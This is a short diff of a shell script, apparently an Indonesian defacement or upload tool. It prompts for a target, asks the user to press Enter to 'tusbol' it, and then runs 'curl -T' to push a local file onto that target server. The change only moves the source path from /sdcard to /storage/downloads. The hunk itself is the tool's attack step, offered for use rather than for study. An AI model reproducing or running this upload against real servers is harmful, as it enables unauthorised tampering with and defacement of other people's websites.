@@ -93,7 +93,7 @@ read tg
 echo ""
 echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
 read trgt
-curl -T /sdcard/$sc $tg
+curl -T /storage/downloads/$sc $tg
 echo ""
 echo ""
 echo $me"========================================"
